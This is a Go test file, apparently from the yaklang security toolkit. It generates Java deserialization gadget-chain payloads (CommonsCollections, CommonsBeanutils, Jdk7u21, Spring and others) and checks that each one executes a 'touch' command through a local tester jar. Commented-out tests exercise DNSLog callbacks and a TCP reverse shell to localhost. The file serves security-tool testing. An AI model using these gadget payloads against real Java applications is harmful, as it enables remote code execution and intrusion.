package yaktest

import (
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak"
	"testing"
)

var ysoTestCode = `
extArgsMap = {
	"CommonsBeanutils2_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"CommonsBeanutils1_183":"org.apache.commons.beanutils.BeanComparator:cb183",
	"CommonsCollections1":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Jdk7u21":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Jdk8u20":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_8u20,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_8u20,java.beans.beancontext.BeanContextSupport:BeanContextSupport,java.beans.beancontext.BeanContextSupport$1:BeanContextSupport$1,java.beans.beancontext.BeanContextSupport$2:BeanContextSupport$2,java.beans.beancontext.BeanContextSupport$BCSChild:BeanContextSupport$BCSChild,java.beans.beancontext.BeanContextSupport$BCSIterator:BeanContextSupport$BCSIterator",
	"Spring2":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"Spring1":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
	"CommonsCollections3":"sun.reflect.annotation.AnnotationInvocationHandler:AnnotationInvocationHandler_7u21,sun.reflect.annotation.AnnotationInvocationHandler$1:AnnotationInvocationHandler$1_7u21",
}
transformChianGadgets = ["CommonsCollections1","CommonsCollections5","CommonsCollections6","CommonsCollections6Lite","CommonsCollections7","CommonsCollections9","CommonsCollectionsK3"]
for gadgetName in transformChianGadgets{
	extArg = ""
	if extArgsMap[gadgetName] != nil{
		extArg = "=/tmp,"+extArgsMap[gadgetName]
	}
	randomstr = str.RandStr(8)
	path = "/tmp/%s" % randomstr
	gadgetIns = yso.GetGadget(gadgetName,yso.useTransformChain("raw_cmd","touch "+path))~
	payload = yso.ToBytes(gadgetIns)~
	payloadBase64 = codec.EncodeBase64(payload)~
	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
	exec.System(cmd)
	if !file.IsExisted(path){
		panic("not found file")
	}
	file.Remove(path)
	log.info("gadget %s exec test success",gadgetName)
}

templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
//templateGadgetNames = ["MozillaRhino1"]
failedGadgets = []
for gadgetName in templateGadgetNames{
	try{
		extArg = ""
		if extArgsMap[gadgetName] != nil{
			extArg = "=/tmp,"+extArgsMap[gadgetName]
		}
		randomstr = str.RandStr(8)
		path = "/tmp/%s" % randomstr
		gadgetIns = yso.GetGadget(gadgetName,yso.useRuntimeExecEvilClass("touch "+path))~
		payload = yso.ToBytes(gadgetIns)~
		payloadBase64 = codec.EncodeBase64(payload)~
		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
		exec.System(cmd)
		if !file.IsExisted(path){
			panic("not found file")
		}
		file.Remove(path)
		log.info("gadget %s exec test success",gadgetName)
	}catch e{
		log.error("gadget %s exec test failed: %v", gadgetName,e)
		failedGadgets.Append(gadgetName)
	}
}
reportFailedGadget(failedGadgets)
`

func TestGadgetBaseExternalJarTool(t *testing.T) {
	_, err := yak.Execute(ysoTestCode, map[string]any{
		"reportFailedGadget": func(gs any) {
			failedGadgets := utils.InterfaceToSliceInterface(gs)
			if len(failedGadgets) > 0 {
				t.Fatalf("failed gadgets: %v", failedGadgets)
			}
		},
	})
	if err != nil {
		t.Fatal(err)
	}
}

const classTestCode = `
execPayload = (arg...) => {
	gadgetIns = yso.GetGadget("CommonsBeanutils1",arg...)~
	payload = yso.ToBytes(gadgetIns)~
	payloadBase64 = codec.EncodeBase64(payload)~
	cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar' -jar /tmp/yak-yso-tester.jar '%s'"%[payloadBase64]
	exec.System(cmd)
println(cmd)
}
// DNSLog
//domain,token = risk.NewDNSLogDomain()~
//execPayload(yso.useDNSLogEvilClass(domain))
//_,err =risk.CheckDNSLogByToken(token, 3)
//if err {
//    panic("not found record")
//}
// RuntimeExec
//randomstr = str.RandStr(8)
//path = "/tmp/%s" % randomstr
//execPayload(yso.useRuntimeExecEvilClass("touch "+path))
//if !file.IsExisted(path){
//	panic("not found file")
//}
//file.Remove(path)
//// ProcessBuilderExec
//randomstr = str.RandStr(8)
//path = "/tmp/%s" % randomstr
//execPayload(yso.useProcessBuilderExecEvilClass("touch "+path))
//if !file.IsExisted(path){
//	panic("not found file")
//}
//file.Remove(path)
//// ProcessImplExec
//randomstr = str.RandStr(8)
//path = "/tmp/%s" % randomstr
//execPayload(yso.useProcessImplExecEvilClass("touch "+path))
//if !file.IsExisted(path){
//	panic("not found file")
//}
//file.Remove(path)

// TODO: build a jar for auto test web env
// ModifyTomcatMaxHeaderSize 
//execPayload(yso.useModifyTomcatMaxHeaderSizeTemplate())
// TcpReverse
//host = "127.0.0.1"
//port = os.GetRandomAvailableTCPPort()
//token = str.RandStr(8)
//recvToken = ""
//go tcp.Serve(host, port, tcp.serverCallback(conn=>{
//	conn.SetTimeout(3)
//	byt = conn.Recv()~
//	recvToken = str.TrimSpace(string(byt))
//}))
//execPayload(yso.useTcpReverseEvilClass(host,port),yso.tcpReverseToken(token))
//sleep(0.5)
//recvToken = recvToken[2:]
//if recvToken != token {
//	panic("not found token")
//}
//host = "127.0.0.1"
//port = os.GetRandomAvailableTCPPort()
//recvToken = ""
//go tcp.Serve(host, port, tcp.serverCallback(conn=>{
//	conn.Send("echo -n 'hello'|md5|cut -d ' ' -f1")
//	conn.SetTimeout(3)
//	byt = conn.Recv()~
//	dump(byt)
//	recvToken = str.TrimSpace(string(byt))
//	conn.Close()
//}))
//execPayload(yso.useTcpReverseShellEvilClass(host,port))
//sleep(0.5)
//dump(recvToken)

execPayload(yso.useSleepTime(10000),yso.useSleepTemplate())
`

func TestClassesBaseExternalJarTool(t *testing.T) {
	_, err := yak.Execute(classTestCode, map[string]any{
		"reportFailedGadget": func(gs any) {
			failedGadgets := utils.InterfaceToSliceInterface(gs)
			if len(failedGadgets) > 0 {
				t.Fatalf("failed gadgets: %v", failedGadgets)
			}
		},
	})
	if err != nil {
		t.Fatal(err)
	}
}
